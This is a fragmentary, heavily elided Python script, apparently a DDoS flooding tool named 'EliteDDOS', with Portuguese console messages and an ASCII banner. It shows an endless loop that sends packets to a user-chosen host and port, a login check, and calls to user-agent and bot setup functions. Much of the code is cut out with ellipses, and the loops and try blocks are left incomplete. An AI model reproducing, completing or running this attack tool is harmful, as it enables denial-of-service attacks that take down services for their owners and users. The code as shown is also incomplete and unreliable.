                ...
                while True:
                    ...
                    if s.sendto(packet, (host, int(port))):
                        ...
                        print("\033[92m", time.ctime(time.time()),
                              "\033[0m \033[94m <--Pacote enviado. EliteDDOS--> \033[0m")
                    else:
                        s.shutdown(1)
...
╚══════╝╚══════╝╚═╝   ╚═╝   ╚══════╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
        ...
        if __name__ == '__main__':
            ...
            print("\033[94mEspera aí eu tô olhando uns bagulho aqui\033[0m")
            print("\033[94mPor Favor\033[0m")
            user_agent()
            my_bots()
            time.sleep(5)
            try:
                ...
                print("\033[91mvê se o ip e a porta estão certos,se não tu me complica\033[0m")
                usage()
            while True:
        ...
        print("\033[;49;91m ID ou Senha Errada,tenta novamente.")
